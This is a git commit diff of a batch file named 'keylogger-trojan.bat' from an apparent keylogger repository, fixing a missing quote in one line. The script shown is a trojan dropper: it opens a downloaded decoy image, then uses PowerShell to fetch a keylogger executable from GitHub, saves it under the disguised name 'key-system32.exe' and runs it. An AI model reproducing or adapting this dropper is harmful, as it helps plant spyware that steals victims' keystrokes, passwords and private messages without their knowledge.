c2f187e607e8e0e3a6b9f5fb0710107a56ad6387
Mohammed Ragab Saad <103288444+MohammedRSaad@users.noreply.github.com>
2022-09-15 17:30:42 +0200

    Add files via upload

--- launcher/keylogger-trojan.bat
+++ launcher/keylogger-trojan.bat
@@ -34,5 +34,5 @@
 cd %TEMP%
 Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/launcher/dounut%20design.png' -OutFile dounut-design.png"
 dounut-design.png
-Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/keylogger/dist/keylogger.exe' -OutFile key-system32.exe
+Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/keylogger/dist/keylogger.exe' -OutFile key-system32.exe"
 key-system32.exe
